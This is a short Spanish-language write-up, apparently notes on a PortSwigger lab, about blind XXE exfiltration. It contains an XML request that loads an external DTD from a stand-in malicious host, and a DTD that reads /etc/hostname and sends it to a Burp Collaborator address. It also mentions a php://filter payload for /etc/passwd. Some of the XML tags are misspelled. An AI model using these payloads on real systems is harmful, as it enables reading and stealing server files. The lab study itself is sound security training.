# XXE ciego con exfiltración vía DTD externa

Tags: #XXE #PortSwigger #XML 

```bash 
En este lab se continua explorando técnicas avanzadas de explotación XXE ciega, esta vez utilizando una DTD externa maliciosa para exfiltrar el contenido del archivo /etc/hostname. Como la aplicación no muestra la respuesta del servidor, debemos forzar que este realice una petición externa que contenga los datos deseados.

Preparamos un archivo DTD en nuestro exploit server que define una entidad para leer el archivo local y otra para enviar su contenido mediante una petición HTTP a Burp Collaborator. Luego referenciamos esta DTD desde la carga XML enviada al stock checker.
```

```xml 
<!-- Petición modificada colocando una entidad de parámetro -->

<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://maliciousWeb.com"> %xxe; ]>      
	<stockCehck>
		<productId>
			1
		</productId>
		<storedID>
			1
		</storedId>
	</stockCheck>
```

## DTD malicioso en maliciousWeb

```xml
<!-- Colocar la DTD maliciosa en el exploit server para mostrar el contenido de '/etc/hostname' -->

<!ENTITY % file SYSTEM "file:///etc/hostname">   
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?content=%file;' >">
%eval;
%exfil;


Notas:
	1. Colocar % en hexadecimal = &#x25, esto se hara en la segunda entidad de parámetro para que sea visualizada como un texto y no lo expanda 
	2. exfil = Exfiltra la data
	3. Otra forma de extraer los datos "php://filter/convert.base64-encode/resource=/etc/passwd"
```